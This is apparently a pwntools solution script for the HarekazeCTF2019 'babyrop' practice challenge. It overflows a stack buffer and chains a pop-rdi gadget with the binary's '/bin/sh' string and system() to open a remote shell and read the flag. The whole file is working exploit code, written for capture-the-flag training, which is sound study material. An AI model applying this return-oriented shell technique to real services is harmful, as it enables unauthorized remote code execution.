from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 28730)
e = ELF('./HarekazeCTF2019_babyrop1')
# ROPgadget --binary ./HarekazeCTF2019_babyrop1 --only "pop|ret"
pop_rdi = 0x400683
system_address = e.symbols['system'] # 0x400490
# ROPgadget --binary ./HarekazeCTF2019_babyrop1 --string "/bin/sh"
bin_sh_address = 0x601048
payload = b'a'*0x10 + b'fuckpwn!'
payload += flat(pop_rdi, bin_sh_address, system_address)
io.sendlineafter(b'What\'s your name? ', payload)
io.interactive()  # cat /home/babyrop flag